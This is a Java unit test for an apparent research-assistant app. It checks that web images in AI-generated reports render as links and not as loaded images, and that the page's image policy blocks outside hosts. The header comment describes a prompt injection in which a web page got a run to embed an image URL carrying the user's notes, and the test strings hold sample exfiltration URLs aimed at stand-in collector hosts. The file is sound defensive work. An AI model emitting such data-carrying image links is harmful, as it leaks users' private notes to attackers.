package org.researchzosho.librarian;

import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * A report, a claim or a job's result shows only the library's own pictures; one at an address on the web is a link, and the page's
 * policy lets the web's pictures in only on a mark the library itself writes (round F, the second review, S6, proved on c8e057ed: a page
 * told a run to put ![s](https://x/b.png?d=&lt;notes&gt;) inside a report's sentence, and opening the report sent the notes).
 */
class ReportWebPicturesTest {
    @Test
    void aPictureOfTheWebInAReportIsALinkAndTheLibrarysOwnIsAPicture() {
        String report = "The ferry closed in 1968 [1]. ![status](https://collect-c.example/b.png?d=grandmother-crossed-1952) See the minutes.\n\n"
                + "![s](https://collect-c.example/c.png?d=second)\n\n![The 1938 timetable](/images/0fb098ddd11eb978.png)\n";
        String html = Pages.md(RunPictures.shown(null, report, s -> { }));
        assertFalse(html.contains("src=\"https://"), "nothing at an address on the web is loaded: " + html);
        assertTrue(html.contains("<a href=\"https://collect-c.example/b.png?d=grandmother-crossed-1952\" rel=\"noreferrer\">status</a>"), html);
        String lines = Pages.md("![s](https://collect-c.example/c.png?d=second)\n\n![The 1938 timetable](/images/0fb098ddd11eb978.png)\n");
        assertTrue(lines.contains("<a href=\"https://collect-c.example/c.png?d=second\" rel=\"noreferrer\">s</a>") && !lines.contains("src=\"https://"), "on a line of its own too: " + lines);
        assertTrue(lines.contains("<img class=\"figure\" src=\"/images/0fb098ddd11eb978.png\""), "the library's own picture is drawn: " + lines);
        assertEquals("img-src 'self'", Pages.imgPolicy(html), "the page's policy keeps the web's pictures out");
        // words that look like the library's mark do not open the policy: the mark is made at random when the program starts
        assertEquals("img-src 'self'", Pages.imgPolicy(Pages.md("<img class=\"thumb\" src=\"https://x.example/a.png\"> data-shown=\"0\"")));
        assertEquals("img-src 'self'", Pages.imgPolicy("<p><img class=\"thumb\" src=\"https://x.example/a.png\"></p>"), "a picture of the web without the library's mark opens nothing, however it came onto the page");
        // a picture the library found and shows from the web, in its own chat line, carries the mark
        assertEquals("img-src 'self' https:", Pages.imgPolicy(Pages.prose("Pictures found:\n![A red fox](https://img.example.org/fox.png)\n![A grey fox](https://img.example.org/grey.png)")));
    }
}
